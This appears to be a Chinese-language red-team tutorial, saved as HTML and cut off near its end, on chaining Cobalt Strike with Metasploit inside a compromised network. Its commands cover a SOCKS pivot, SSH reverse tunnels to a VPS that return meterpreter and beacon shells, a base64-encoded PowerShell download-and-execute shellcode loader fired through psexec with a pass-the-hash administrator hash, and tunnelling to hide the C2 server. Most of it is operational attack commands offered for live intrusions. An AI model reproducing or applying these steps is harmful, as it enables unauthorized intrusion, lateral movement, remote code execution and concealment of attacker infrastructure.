<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cobaltstrike与metasploit实战联动"><span class="csDE05BCC">CobaltStrike</span><span class="csECDA2D3">与</span><span class="csDE05BCC">Metasploit</span><span class="csECDA2D3">实战联动</span></a></h1>
		<h2 class="cs868C439D">
			<a name="X1f531057d5c22413d5d235976dc75478ce90e08"><span class="csB2D98684">0x01 </span><span class="cs83F14626">前言</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">关于</span><span class="cs8926E06"> cobalstrike[</span><span class="cs9C1B1871">以下全部简称</span><span class="cs8926E06">&quot;cs&quot;] </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> Metasploit [</span><span class="cs9C1B1871">以下全部简称</span><span class="cs8926E06"> &quot;msf&quot;] </span><span class="cs9C1B1871">想必此处就不用再多废话了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">总之</span><span class="cs8926E06">,</span><span class="cs9C1B1871">两者各有所长</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如</span><span class="cs8926E06">,</span><span class="cs9C1B1871">前者更适合做个稳控平台</span><span class="cs8926E06">,</span><span class="cs9C1B1871">后者则更擅长各类内网搜集和漏洞利用</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而我们今天的目的就是为了把两者的优点尽可能的灵活结合起来进行运用</span><span class="cs8926E06">,</span><span class="cs9C1B1871">让各自相互依托</span><span class="cs8926E06">,</span><span class="cs9C1B1871">去做自己最擅长的事情</span><span class="cs8926E06">,</span><span class="cs9C1B1871">废话不多讲</span><span class="cs8926E06">,</span><span class="cs9C1B1871">来看实际操作</span></p><h2 class="cs868C439D">
			<a name="X5edaed8edfbdcf5648990f77c2293651f719345"><span class="csB2D98684">0x02 </span><span class="cs83F14626">通过</span><span class="csB2D98684"> beacon </span><span class="cs83F14626">内置的</span><span class="csB2D98684"> socks </span><span class="cs83F14626">功能将本地</span><span class="csB2D98684"> Msf </span><span class="cs83F14626">直接代入目标内网进行操作</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">首先</span><span class="cs8926E06">,</span><span class="cs9C1B1871">到已控目标内网机器的</span><span class="cs8926E06"> beacon shell </span><span class="cs9C1B1871">下把</span><span class="cs8926E06"> socks </span><span class="cs9C1B1871">起起来</span><span class="cs8926E06">,[ </span><span class="cs9C1B1871">注</span><span class="cs8926E06">: </span><span class="cs9C1B1871">今天此处所演示的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">全部都是在</span><span class="cs8926E06"> system </span><span class="cs9C1B1871">权限进行操作</span><span class="cs8926E06"> ]</span></p><p class="cs3A447A38"><span class="cs9FB05234">beacon&gt; getuid</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; socks 1080</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image0.png" width="560" height="171" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">接着</span><span class="cs8926E06">,</span><span class="cs9C1B1871">点开</span><span class="cs8926E06"> cs </span><span class="cs9C1B1871">菜单找到</span><span class="cs8926E06">&quot;Proxy Pivots&quot;</span><span class="cs9C1B1871">复制生成的</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">代理链接</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image1.png" width="560" height="126" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">本地启动</span><span class="cs8926E06"> msf,</span><span class="cs9C1B1871">挂着上面生成的代理链接</span><span class="cs8926E06">,</span><span class="cs9C1B1871">即可直接对目标内网进行各种探测</span><span class="cs8926E06">,</span><span class="cs9C1B1871">实际效果如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">msf &gt; setg Proxies socks4:138.128.218.66:1080 </span><span class="cs7FFD2630">意思就是让本地的</span><span class="cs9FB05234"> msf </span><span class="cs7FFD2630">走上面</span><span class="cs9FB05234"> cs </span><span class="cs7FFD2630">的</span><span class="cs9FB05234"> socks </span><span class="cs7FFD2630">代理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; setg ReverseAllowProxy true </span><span class="cs7FFD2630">建双向通道</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; use auxiliary/scanner/smb/smb_version </span><span class="cs7FFD2630">拿着</span><span class="cs9FB05234"> msf </span><span class="cs7FFD2630">中的各类探测模块对目标内网进行正常探测即可</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">比如</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">识别目标内网所有</span><span class="cs9FB05234"> windows </span><span class="cs7FFD2630">机器的详细系统版本</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">机器名和所在域</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set rhosts 172.17.180.0/24 </span><span class="cs7FFD2630">指定</span><span class="cs9FB05234"> CIDR </span><span class="cs7FFD2630">格式的目标内网段</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">掩码可根据实际情况给的大一点</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">比如</span><span class="cs9FB05234">,0/20,0/16...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set threads 1 </span><span class="cs7FFD2630">线程不易给的太大</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">可根据目标实际情况</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">控制在</span><span class="cs9FB05234"> 10 </span><span class="cs7FFD2630">以内</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; run</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image2.png" width="560" height="216" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">利用这种方式可以极大的帮我们解决要自己往上传工具的不便及尴尬</span></p><h2 class="cs868C439D">
			<a name="X1a0fd8150f35ab8834039ac97c1ce462502837e"><span class="csB2D98684">0x03 </span><span class="cs83F14626">尝试借助</span><span class="csB2D98684"> CobaltStrike </span><span class="cs83F14626">的外部</span><span class="csB2D98684"> tcp </span><span class="cs83F14626">监听器通过</span><span class="csB2D98684"> ssh </span><span class="cs83F14626">隧道直接派生一个</span><span class="csB2D98684"> meterpreter </span><span class="cs83F14626">的</span><span class="csB2D98684"> shell </span><span class="cs83F14626">到本地</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">先在</span><span class="cs8926E06"> cs </span><span class="cs9C1B1871">上创建一个</span><span class="cs8926E06"> tcp </span><span class="cs9C1B1871">的外部监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">回连端口设为</span><span class="cs8926E06"> 8080</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image3.png" width="560" height="291" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">接着</span><span class="cs8926E06">,</span><span class="cs9C1B1871">到本地机器把</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">起起来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并创建如下监听器</span></p><p class="cs3A447A38"><span class="cs9FB05234">msf &gt; use exploit/multi/handler</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set payload windows/meterpreter/reverse_tcp </span><span class="cs7FFD2630">注</span><span class="cs9FB05234">: </span><span class="cs7FFD2630">此处的协议格式务必要和上面</span><span class="cs9FB05234"> cs </span><span class="cs7FFD2630">外部监听器的协议对应</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">不然</span><span class="cs9FB05234"> meter </span><span class="cs7FFD2630">是无法正常回连的</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set lhost 192.168.3.137</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set lport 8080</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; exploit</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image4.png" width="560" height="144" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">随后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">回到自己的</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">机器上编辑</span><span class="cs8926E06"> sshd </span><span class="cs9C1B1871">配置</span><span class="cs8926E06">,</span><span class="cs9C1B1871">开启</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">转发功能</span><span class="cs8926E06">,</span><span class="cs9C1B1871">重启</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">服务</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这是所有使用</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道转发前的必备操作</span><span class="cs8926E06">,</span><span class="cs9C1B1871">后续不再啰嗦</span></p><p class="cs3A447A38"><span class="cs9FB05234"># vi /etc/ssh/sshd_config</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">AllowTcpForwarding yes</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">GatewayPorts yes</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">TCPKeepAlive yes</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PasswordAuthentication yes</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># systemctl restart sshd.service</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">再次回到自己本地的</span><span class="cs8926E06"> linux </span><span class="cs9C1B1871">中并通过</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道做好如下转发</span><span class="cs8926E06">,</span><span class="cs9C1B1871">意思就是通过</span><span class="cs8926E06"> 20.37.125.56 </span><span class="cs9C1B1871">这台机器把来自外部的</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口流量全部转到我本地</span><span class="cs8926E06"> 192.168.3.137 </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而本地</span><span class="cs8926E06"> 192.168.3.137 </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 8080</span><span class="cs9C1B1871">端口上跑的又正好是</span><span class="cs8926E06"> meter </span><span class="cs9C1B1871">的监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以</span><span class="cs8926E06">,</span><span class="cs9C1B1871">最终才会造成</span><span class="cs8926E06"> meterpreter </span><span class="cs9C1B1871">本地上线的效果</span></p><p class="cs3A447A38"><span class="cs9FB05234"># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.3.137:8080 root@20.37.125.56 -p 22</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image5.png" width="560" height="93" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">隧道建立之后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">习惯性的到</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">上去看一眼</span><span class="cs8926E06">,</span><span class="cs9C1B1871">刚才通过隧道监听的</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口到底有没有起来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">确实起起来了才说明隧道才是通的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">另外</span><span class="cs8926E06">,</span><span class="cs9C1B1871">监听的端口不能和</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">机器上的现有端口冲突</span><span class="cs8926E06">,</span><span class="cs9C1B1871">否则隧道是建不成功的</span></p><p class="cs3A447A38"><span class="cs9FB05234"># netstat -tulnp | grep &#39;8080&#39;</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image6.png" width="560" height="59" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">最终</span><span class="cs8926E06">,</span><span class="cs9C1B1871">回到</span><span class="cs8926E06"> cs </span><span class="cs9C1B1871">上选择目标内网指定机器的</span><span class="cs8926E06"> beacon shell </span><span class="cs9C1B1871">点击</span><span class="cs8926E06">&quot;Spawn&quot;</span><span class="cs9C1B1871">派生</span><span class="cs8926E06">,</span><span class="cs9C1B1871">再选择刚在上面创建好的</span><span class="cs8926E06"> tcp </span><span class="cs9C1B1871">的外部监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">相应目标机器的</span><span class="cs8926E06"> meterpreter </span><span class="cs9C1B1871">就会被直接弹到本地</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当然</span><span class="cs8926E06">,</span><span class="cs9C1B1871">你也可以批量选择进行操作</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image7.png" width="560" height="162" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image8.png" width="560" height="203" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image9.png" width="560" height="159" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="Xe5691aa6441934e6f0d70b976521e20358aa3aa"><span class="csB2D98684">0x04 </span><span class="cs83F14626">尝试利用</span><span class="csB2D98684"> msf </span><span class="cs83F14626">的各类</span><span class="csB2D98684"> exp </span><span class="cs83F14626">模块直接弹回一个</span><span class="csB2D98684"> beacon shell</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">如下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">先准备好一段</span><span class="cs8926E06"> 64 </span><span class="cs9C1B1871">位的</span><span class="cs8926E06"> shellcode,</span><span class="cs9C1B1871">如下</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image10.png" width="560" height="300" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">而后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">再对</span><span class="cs8926E06"> Invoke-Shellcode.ps1 </span><span class="cs9C1B1871">脚本中的</span><span class="cs8926E06"> 64 </span><span class="cs9C1B1871">位</span><span class="cs8926E06"> shellcode </span><span class="cs9C1B1871">进行替换</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image11.png" width="560" height="37" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">因为后续需要利用</span><span class="cs8926E06"> powershell </span><span class="cs9C1B1871">远程加载执行</span><span class="cs8926E06"> shellcode,</span><span class="cs9C1B1871">所以为了方便执行</span><span class="cs8926E06">,</span><span class="cs9C1B1871">得事先把</span><span class="cs8926E06"> powershell </span><span class="cs9C1B1871">加载语句编码整理下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">PS C:\&gt; $text = &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://*/master/Invoke-Shellcode.ps1&#39;); Invoke-demo -Force&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PS C:\&gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PS C:\&gt; $EncodedText =[Convert]::ToBase64String($Bytes)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PS C:\&gt; $EncodedText &gt; bs64.txt</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image12.png" width="560" height="59" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">比如我们现在通过其它方式拿到了目标内网的某台</span><span class="cs8926E06"> windows </span><span class="cs9C1B1871">机器的本地管理员密码</span><span class="cs8926E06"> hash,</span><span class="cs9C1B1871">就可以尝试利用</span><span class="cs8926E06"> psexec_command </span><span class="cs9C1B1871">模块借助这种方式来直接反弹指定目标机器的</span><span class="cs8926E06"> beacon shell,</span><span class="cs9C1B1871">也算一种简单的横向方式</span></p><p class="cs3A447A38"><span class="cs9FB05234">msf &gt; use auxiliary/admin/smb/psexec_command</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set rhost 192.168.3.11</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set smbuser administrator</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set smbpass AAD3B435B51404EEAAD3B435B51404EE:CCEF208C6485269C20DB2CAD21734FE7</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set command powershell -exec bypass -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZ*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; set threads 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf &gt; run </span><span class="cs7FFD2630">此处不用管它服务到底没有启动成功</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image13.png" width="560" height="157" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">最终</span><span class="cs8926E06">,</span><span class="cs9C1B1871">成功上线效果</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image14.png" width="560" height="178" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="X7652370eb47dacc97f5ed73c25b17d0d977f790"><span class="csB2D98684">0x05 </span><span class="cs83F14626">灵活利用</span><span class="csB2D98684"> ssh </span><span class="cs83F14626">隧道深度隐藏</span><span class="csB2D98684"> C2 [ becon </span><span class="cs83F14626">本地上线</span><span class="csB2D98684"> ,</span><span class="cs83F14626">适合临时渗透用</span><span class="csB2D98684"> ]</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">首先</span><span class="cs8926E06">,</span><span class="cs9C1B1871">创建一个普通的</span><span class="cs8926E06"> http </span><span class="cs9C1B1871">反向</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并用该监听器生成一个</span><span class="cs8926E06"> 64 </span><span class="cs9C1B1871">位的</span><span class="cs8926E06"> exe payload,</span><span class="cs9C1B1871">随后再立即删除该监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">具体如下</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image15.png" width="560" height="89" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">而后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">回到自己本地的</span><span class="cs8926E06"> linux </span><span class="cs9C1B1871">中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">开始尝试和自己的</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">建立</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道</span><span class="cs8926E06">,</span><span class="cs9C1B1871">注意</span><span class="cs8926E06">,</span><span class="cs9C1B1871">此处用于建立隧道的这台</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">和我们</span><span class="cs8926E06"> cs </span><span class="cs9C1B1871">团队服务器所在的</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">不是同一台机器</span><span class="cs8926E06">[</span><span class="cs9C1B1871">实际中有条件的情况下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也建议不要用同一台</span><span class="cs8926E06">],</span><span class="cs9C1B1871">转发和上面的那个</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道差不太多</span><span class="cs8926E06">,</span><span class="cs9C1B1871">只不过这里是通过</span><span class="cs8926E06"> 20.37.125.56 </span><span class="cs9C1B1871">这台机器把外部的</span><span class="cs8926E06"> 8080 </span><span class="cs9C1B1871">端口都转到了本地</span><span class="cs8926E06"> 192.168.3.137 </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> 80 </span><span class="cs9C1B1871">端口上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而这个</span><span class="cs8926E06"> 80 </span><span class="cs9C1B1871">端口上跑的也就是我们下面创建的那个</span><span class="cs8926E06"> inside </span><span class="cs9C1B1871">监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以最终才会造成</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">的本地上线</span></p><p class="cs3A447A38"><span class="cs9FB05234"># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.3.137:80 root@20.37.125.56 -p 22</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image16.png" width="560" height="43" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">此处还是习惯性的到建立隧道的那台</span><span class="cs8926E06"> vps </span><span class="cs9C1B1871">上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">看看刚刚隧道监听的端口有没有起来</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image17.png" width="560" height="52" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">紧接着</span><span class="cs8926E06">,</span><span class="cs9C1B1871">再次回到自己本地的</span><span class="cs8926E06"> linux </span><span class="cs9C1B1871">中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">启动</span><span class="cs8926E06"> cs </span><span class="cs9C1B1871">团队服务器和客户端</span></p><p class="cs3A447A38"><span class="cs9FB05234"># ./teamserver 192.168.3.137 admin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># ./cobaltstrike</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image18.png" width="560" height="63" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">继续创建</span><span class="cs8926E06"> http </span><span class="cs9C1B1871">反向</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">注意</span><span class="cs8926E06">,</span><span class="cs9C1B1871">此处</span><span class="cs8926E06"> inside </span><span class="cs9C1B1871">监听器的类型和上面</span><span class="cs8926E06"> outside </span><span class="cs9C1B1871">监听器的类型务必要保持完全一致</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不然</span><span class="cs8926E06">,beacon </span><span class="cs9C1B1871">是弹不回来的</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image19.png" width="560" height="117" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">最后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">把上面那个用</span><span class="cs8926E06"> outside </span><span class="cs9C1B1871">监听器创建的</span><span class="cs8926E06"> exe payload </span><span class="cs9C1B1871">丢到目标机器上去执行</span><span class="cs8926E06">,</span><span class="cs9C1B1871">实现的最终效果就是把来自公网的</span><span class="cs8926E06"> beacon shell </span><span class="cs9C1B1871">通过</span><span class="cs8926E06"> ssh </span><span class="cs9C1B1871">隧道直接弹到了本地</span><span class="cs8926E06">,</span><span class="cs9C1B1871">避免了直接把</span><span class="cs8926E06"> cs </span><span class="cs9C1B1871">团队服务器暴露在公网</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/CobaltStrike%e4%b8%8eMetasploit%e5%ae%9e%e6%88%98%e8%81%94%e5%8a%a8_files/image20.png" width="560" height="264" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="小结"><span class="cs83F14626">小结</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">小结</span><span class="cs8926E06">: </span><span class="cs9C1B1871">以上每种方式其实都对应的有特定的渗透场景</span><span class="cs8926E06">,</span><span class="cs9C1B1871">至于实战中如何灵活配合利用</span><span class="cs8926E06">,</span><span class="cs9C1B1871">就要看弟兄们自己的实际需求了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">另外多说一点</span><span class="cs8926E06">,</span><span class="cs9C1B1871">似乎很多人都在以讹传讹</span><span class="cs8926E06">,</span><span class="cs9C1B1871">觉得现在</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">完全没有任何用武之地</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其实</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不然</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当然啦</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如果你就只想用它的各类</span><span class="cs8926E06"> exp </span><span 